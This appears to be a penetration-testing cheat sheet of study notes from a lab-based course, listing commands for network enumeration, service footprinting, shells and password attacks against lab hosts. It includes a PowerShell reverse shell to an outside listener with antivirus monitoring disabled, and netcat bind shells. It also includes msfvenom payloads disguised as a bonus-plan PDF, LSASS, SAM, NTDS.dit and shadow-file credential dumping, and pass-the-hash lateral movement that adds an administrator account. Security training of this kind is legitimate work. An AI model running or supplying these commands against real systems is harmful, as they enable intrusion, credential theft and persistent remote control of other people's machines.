# Network Enumeration with Nmap
## Discover Alive Hosts
```
nmap 10.129.2.0/24 -sn -oA alive_hosts | grep for | cut -d" " -f5
```

## Nmap host scans
```
nmap
nmap -sS -p- -A 10.129.2.1 -oA ss_host_scan
nmap -sT -p- -A 10.129.2.1 -oA st_host_scan
nmap -F -sU 10.129.2.1 -oA su_host-scan
```

## Vulnerability Scan
```
nmap 10.129.2.1 -p- -A --script vuln
```

## DNS Proxying
```
nmap -sS -p- -A 10.129.2.1 -oA ss_dns_host_scan --source-port 53
```

# Footprinting
## Infrastructure Enumeration
### Domain Enumeration
#### Certificate Transparency
Check crt.sh
#### Company Hosted Servers 
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
```
#### Shodan Scan
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
for i in $(cat ip-addresses.txt);do shodan host $i;done
```
#### DNS Records
```
dig any inlanefreight.com
```

### Cloud Enumeration
#### Google Search for AWS
```
intext: inurl:amazonaws.com
```
#### Google Search for Azure
```
intext: inurl:blog.core.windows.net
```
#### Website Source Code
View the source code for amazonaws and windows.net

#### Domain.Glass
View the security assessment
#### GrayHatWarfare
Search for leaked data.

### Staff
Check employees linkedin. If we find a github, look through it. 


## Host Based Enumeration
### FTP
#### Check for anonymous login
```
ftp 10.129.14.136
```
#### Basic Enumeration (FTP Session)
```
ls
ls -R
status
debug
trace
get
put
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

#### Nmap Enumeration
```
nmap -sV -p21 -sC -A 10.129.14.136
```

### SMB
#### Enumerate available shares and connect to a share
```
smbclient -N -L //10.129.14.128
smbclient //10.129.14.128/notes
```
#### Interacting with SMB
```
get pred-prod.txt
put doc.txt
smbstatus
```
#### Enumerate with Nmap
```
nmap 10.129.14.128 -sV -sC -p139,445
```
#### Enumerate with RPCclient
```
rpcclient -U "" 10.129.14.128
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo notes
enumdomusers
queryuser 0x3e9
querygroup0x201
```
#### Bruteforce RIDs
```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
#### Samrdump.py
```
samrdump.py 10.129.14.128
```
#### smbmap
```
smbmap -H 10.129.14.128
```
#### CrackMapExec
```
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
#### Enum4Linux
```
enum4linux -a 10.10.10.225
```

### NFS
#### Enumerate with Nmap
```
nmap 10.129.14.128 -p111,2049 -sV -sC
nmap --script nfs* 10.129.14.128 -sV -p111,2049
```
#### Show Available NFS Shares
```
showmount -e 10.129.14.128
```
#### Mount an NFS Share
```
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```
#### Listing Contents with Usernames and Group Names
```
ls -l mnt/nfs/
```
#### Listing Contents with UIDs and GUIDs
```
ls -n mnt/nfs/
```
#### Unmounting
```
sudo umount ./target-NFS
```

### DNS
#### DIG
##### DNS SOA Record
```
dig soa www.inlanefreight.com
```
##### DIG - NS Query
```
dig ns inlanefreight.htb @10.129.14.128
```
##### DIG - Version Query
```
dig CH TXT version.bind 10.129.120.85
```
##### DIG - ANY Query
```
dig any inlanefreight.htb @10.129.14.128
```
##### DIG - AXFR Zone Transfer
```
dig axfr inlanefreight.htb @10.129.14.128
```
##### DIG - ACFR Zone Transfer - Internal
```
dig axfr internal.inlanefreight.htb @10.129.14.128
```
#### Subdomain Bruteforcing
##### DIG
```
for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```
##### DNSEnum
```
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

### SMTP
#### Intereact with SMTP with Telnet
```
telnet 10.129.14.128 25
HELO mail1.inlanefreight.htb
EHLO mail1
VRFY root
VRFY cry0l1t3
```
#### Send an Email
```
telnet 10.129.14.128 25
EHLO inlanefreight.htb
MAIL FROM: <cry0l1t3@inlanefreight.htb>
RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
DATA
From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.
```
#### Footprint the Service with Nmap
```
nmap 10.129.14.128 -sC -sV -p25
nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

### IMAP/POP3
#### Footprinting IMAP/POP3 with Nmap
```
nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```
#### Interacting with IMAP/POP3
```
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

### SNMP
#### Brute Force Community Strings
```
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
```
#### SNMPwalk
```
snmpwalk -v2c -c public 10.129.14.128
```
#### Braa
```
braa <community string>@<IP>:.1.3.6.*
```

### MySQL
#### Foorprinting with Nmap
```
nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
#### Interact with MySQL Server
```
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

### MSSQL
#### Enumerate MSSQL with nmap
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
#### Interacting with MSSQL
```
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### Oracle TNS
#### Enumerate TNS with Nmap
```
nmap -p1521 -sV 10.129.204.235 --open
nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
#### ODAT
```
odat all -s 10.129.204.235
```
#### Interact with TNS
```
sqlplus scott/tiger@10.129.204.235/XE;
```
#### SQLPlus Commands
```
https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985
```

### IPMI
#### Footprinting the Service with nmap
```
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```
#### Metasploit Version Scan
```
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
show options
run
```
#### Metasploit Dumping Hashes
```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.42.195
show options
run
```

## Remote Management Protocols
### Linux Remote Management Protocols
#### SSH
##### SSH Audit
```
ssh-audit 10.129.14.132
```
##### Change Authentication Method
```
ssh -v cry0l1t3@10.129.14.132
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

#### Rsync
##### Footprint the service with Nmap
```
nmap -sV -p 873 127.0.0.1
```
##### Probing for Accessible Shares
```
nc -nv 127.0.0.1 873
```
##### Enumerate Open Shares
```
rsync -av --list-only rsync://127.0.0.1/dev
```

#### R-Services
##### Footprint the service with Nmap
```
nmap -sV -p 512,513,514 10.0.17.2
```
##### Logging in with Rlogin
```
rlogin 10.0.17.2 -l htb-student
```
##### List Authenticated Users Using Rwho
```
rwho
```
##### List Authenticatesd Users Using Rusers
```
rusers -al 10.0.17.5
```

### Windows Remote Management Protocols
#### RDP
##### Footprinting the Service with Nmap
```
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
```
##### RDP Security Check
```
./rdp-sec-check.pl 10.129.201.248
```
##### Initiate an RDP Session
```
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248 /dynamic-resolution
```

#### WinRM
##### Footprinting the Service with Nmap
```
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```
##### Evil Winrm
```
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

#### WMI
##### Footprinting the Service with Nmap
```
nmap -sV -sC 10.129.201.248 -p135 --disable-arp-ping -n
```
##### WMIexec
```
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

# Information Gathering - Web Edition
## Passive Information Gathering
### Whois
```
whois facebook.com
```

### DNS
#### nslookup
##### Querying A Records
```
nslookup facebook.com
```
##### Querying A Records for a subdomain
```
nslookup -query=A www.facebook.com
```
##### Querying PTR Records for an IP Address
```
nslookup -query=PTR 31.13.92.36
```
##### Querying ANY Existing Records
```
nslookup -query=ANY facebook.com
```
##### Querying TXT Records
```
nslookup -query=TXT facebook.com
```
##### Querying MX Records
```
nslookup -query=MX facebook.com
```

#### DIG
##### Querying A Records
```
dig facebook.com @1.1.1.1
```
##### Querying A Records for a subdomain
```
dig a www.facebook.com @1.1.1.1
```
##### Querying PTR Records for an IP Address
```
dig -x 31.13.92.36 @1.1.1.1
```
##### Querying ANY Existing Records
```
dig any facebook.com @1.1.1.1
```
##### Querying TXT Records
```
dig txt facebook.com @1.1.1.1
```
##### Querying MX Records
```
dig mx facebook.com @1.1.1.1
```

#### Determine Host
```
nslookup facebook.com
whois 157.240.199.35
```

### Passive Subdomain Enumeration
#### VirusTotal
Check Virustotal Relations
#### Certificates
```
https://cencys.io
https://crt.sh
```
#### TheHarvester
##### Sources.txt
```
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```
##### The Command
```
cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done
cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt"
```

### Passive Infrastructure Enumeration
#### Netcraft
```
https://sitereport.netcraft.com
```
#### Wayback Machine and Wayback URLs
```
waybackurls -dates https://facebook.com > waybackurls.txt
```

## Active Information Gathering
### Active Infrastructure Indentification
#### HTTP Headers
```
curl -I "http://${TARGET}"
```
#### WhatWeb
```
whatweb -a3 https://www.facebook.com -v
```
#### Use Wappalyzer
Use Browser
#### Use WafW00f
```
wafw00f -v https://www.tesla.com
```
#### Aquatone
```
cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
```

### Active Subdomain Enumeration
#### Zone Transfer
1. Identifying Nameservers
```
nslookup -type=NS zonetransfer.me
```
2. Testing for ANY and AXFR Zone Transfer
```
nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja
```
#### Gobuster
```
gobuster dns -d mydomain.com -w /usr/share/wordlists/dirb/common.txt
```

### Virtual Hosts
#### vHost Fuzzing with FFuF
```
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
```

### Crawling
#### Use ZAP
#### Use FFuF
```
ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
```

# Vulnerability Assessment

# Shells & Payloads
## Bind Shell
### Netcat
#### Start Netcat Listener on Target Machine
```
nc -lvnp 7777
```
#### Connect to the Target Machine
```
nc -nv 10.129.41.200 7777
```
### Binding a Bash Shell to TCP
#### Start the Listener
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
#### Connect to the Target
```
nc -nv 10.129.41.200 7777
```

## Reverse Shell
### Netcat
#### Start the Listener on the Attacking Machine
```
nc -lvnp 443
```
#### Connect to the Attacking Machine (Powershell)
```
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

## Payloads
### MSFVenom
#### List Payloads
```
msfvenom -l payloads
```
#### Building a Stageless Payload Linux
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
#### Building a Stageless Payload Windows
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
#### Start the Listener
```
nc -lvnp 443
```

## Windows Shells

## NIX Shells
### Spawn an Interactive Python TTY Shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
### /bin/sh
```
/bin/sh -i
```
### Perl
```
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```
### Ruby
```
ruby: exec "/bin/sh"
```
### lua
```
lua: os.execute('/bin/sh')
```
### awk
```
awk 'BEGIN {system("/bin/sh")}'
```
### find
```
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
### Exec
```
find . -exec /bin/sh \; -quit
```
### vim
```
vim -c ':!/bin/sh'
```
### vim escape
```
vim
:set shell=/bin/sh
:shell
```
## Check permissions
```
ls -lah /path/to/binary
sudo -l
```

## Web Shells
### Laudanum
```
cp /usr/share/webshells/laudanum/aspx/shell.aspx 
```
### Antak
```
/usr/share/nishang/Antak-WebShell
```
### PHP Web Shells
```
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
```

# Password Attacks
## Remote Password Attacks
### Network Services
#### CrackMapExec
```
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
#### Evil-WinRM
```
evil-winrm -i <target-IP> -u <username> -p <password>
```
```
evil-winrm -i 10.129.42.197 -u user -p password
```
#### Hydra - SSH
```
hydra -L user.list -P password.list ssh://10.129.42.197
```
#### Hydra - RDP
```
hydra -L user.list -P password.list rdp://10.129.42.197
```
#### Hydra - SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```

### Default Credentials
```
https://github.com/ihebski/DefaultCreds-cheat-sheet
```

## Windows Local Password Attacks
### Attacking SAM
#### Using reg.exe and secretsdump.py
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.tx
```
#### Using CrackMapExec
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Attacking LSASS
#### Dumping LSASS with Task Manager
Open Task Manager > Right Click Local Security Authority Process > Create Dump File > Navigate to lsass.DMP
```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
#### Dumping LSASS with Powershell
```
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
#### Use Pypykatz to Parse the LSASS Secrets
```
pypykatz lsa minidump /path/to/lsass.dmp 
```
#### Crack NT Hash with HashCat
```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Attacking Active Directory and NTDS.dit
#### From Evil-WinRM
```
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
#### From CrackMapExec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
#### Crack the Hash with Hashcat
```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
#### OR Pass the Hash
```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

### Credential Hunting
#### Lazagne
```
start lazagne.exe all
```
#### Findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.pdf
```

## Linux Local Password Attacks
### Credential Hunting in Linux
#### Find SSH Keys
```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### History
```
cat /home/*/.bash*
```
#### Memory - mimipenguin
```
python3 mimipenguin.py
```
#### Memory - LaZagne
```
python2.7 laZagne.py all
```
#### Browsers - Lazagne
```
python3 laZagne.py browsers
```
#### Browsers Firefox
```
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

### Passwd, SHadow, Opasswd
#### Passwd - Remove root or user password requirement
```
root::0:0:root:/root:/bin/bash
```
#### View Passwd,Shadow,Opasswd
```
cat /etc/passwd
cat /etc/shadow
cat /etc/security/opasswd
```
#### Cracking Linux Credentials
```
cp /etc/passwd /tmp/passwd.bak
cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

## Windows Lateral Movement
### Pass the Hash
#### Enable Restricted Admin Mode to Allow PtH
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
#### Pass the Hash Using Mimikatz
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
#### Invoke-Thehash with SMB
```
cd C:\path\to\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
#### Start a Netcat Listener
```
nc.exe -lvnp 8001
```
#### RevShells Make a Payload
```
https://www.revshells.com/
```
#### Invoke-TheHash with WMi
```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "output from revshell"
```
#### Pass the Hash with Impacket
```
psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
#### Pass the Hash with CrackMapExec
```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
#### Pass the Hash with Evil-WinRM
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
#### Connect to the Machine with RDP
```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /dynamic-resolution
```

### Pass the Ticket - Windows
### Pass the Ticket - Linux

## Cracking Files
### Protected Files
### Protected Archives

## Password Management
### Password Policies
### Password Managers
# Attacking Common Services

# Pivoting, Tunneling, and Port Forwarding

# Active Directory Enumeration & Attacks

# Using Web Proxies

# Attacking Web Applications with Ffuf

# Login Brute Forcing

# SQL Injection Fundamentals

# SQLMap Essentials

# Cross-Site Scripting (XSS)

# File Inclusion

# File Upload Attacks

# Command Injections

# Web Attacks

# Attacking Common Applications

# Linux Privilege Escalation

# Windows Privilege Escalation

# Documentation & Reporting

# Attacking Enterprise Networks
